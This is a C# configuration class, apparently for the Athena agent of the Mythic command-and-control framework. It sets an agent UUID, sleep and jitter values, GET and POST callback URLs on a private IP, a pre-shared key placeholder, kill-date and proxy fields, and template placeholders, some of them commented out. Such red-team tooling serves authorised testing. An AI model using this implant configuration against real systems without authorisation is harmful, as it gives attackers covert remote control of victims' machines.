using System;

namespace Athena
{
    public class Config2
    {
        public string uuid { get; set; }
        public string userAgent { get; set; }
        public string hostHeader { get; set; }
        public int sleep { get; set; }
        public int jitter { get; set; }
        public string getURL { get; set; }
        public string postURL { get; set; }
        public string psk { get; set; }
        public string param { get; set; }
        public DateTime killDate { get; set; }
        public bool encryptedExchangeCheck { get; set; }
        //Change this to Dictionary or Convert from JSON string?
        public string headers { get; set; }
        public string proxyHost { get; set; }
        public string proxyPass { get; set; }
        public int proxyPort { get; set; }
        public string proxyUser { get; set; }


        public Config2()
        {

            this.uuid = "2ecc5761-ba9e-464e-8969-f8ad6650dc11";
            this.userAgent = "%USERAGENT%";
            this.hostHeader = "%HOSTHEADER%";
            this.sleep = Int32.Parse("10");
            this.jitter = Int32.Parse("23");
            this.getURL = "http://10.10.50.43/index";
            this.postURL = "http://10.10.50.43/data";
            this.psk = "%PSK%";
            this.param = "%QUERYPATHNAME%";
 
            /**
            int callbackPort = Int32.Parse("callback_port");
            string callbackHost = "callback_host";
            string callbackURL = $"{callbackHost}:{callbackPort}";
            this.uuid = "2ecc5761-ba9e-464e-8969-f8ad6650dc11";
            this.userAgent = "%USERAGENT%";
            this.hostHeader = "%HOSTHEADER%";
            this.killDate = DateTime.Parse("killdate");
            this.sleep = Int32.Parse("callback_interval");
            this.jitter = Int32.Parse("callback_jitter");
            this.getURL = "callback_host:callback_url/get_uri?query_path_name";
            this.postURL = "callback_host:callback_url/post_uri";
            this.psk = "AESPSK";
            this.param = "query_path_name";
            this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
            this.proxyHost = "proxy_host";
            this.proxyPass = "proxy_pass";
            this.proxyPort = Int32.Parse("proxy_port");
            this.proxyUser = "proxy_user";
            **/
        }
        //Maybe add a named pipe config?

        //#region Mythic
        //// public static string uuid = "%UUID%";
        //public static string userAgent = "%USERAGENT%";
        //public static string hostHeader = "%HOSTHEADER%";
        //public static int sleep = Int32.Parse("10");
        //public static int jitter = Int32.Parse("23");
        ////public static int sleep = Int32.Parse("%SLEEP%");
        ////public static int jitter = Int32.Parse("%JITTER%");
        ////public static DateTime killDate = DateTime.Parse("%KILLDATE%");
        ////public static bool defaultProxy = bool.Parse("%DEFAULTPROXY%");
        ////public static string proxyAddress = "%PROXYADDRESS";
        ////public static string proxyUser = "%PROXYUSER%";
        ////public static string proxyPassword = "%PROXYPASS%";
        //public static string getURL = "http://10.10.50.43/index";
        ////public static string getUrl = "%GETURL%";
        //public static string postURL = "http://10.10.50.43/data";
        ////public static string postURL = "%POSTURL%";
        //public static string psk = "%PSK%";
        ////Necessary?
        //public static string param = "%QUERYPATHNAME%";
        ////public static int chunkSize = Int32.Parse("%CHUNKSIZE%");
        ////public static List<Server> servers = new List<Server> { };
        //#endregion

    }
}
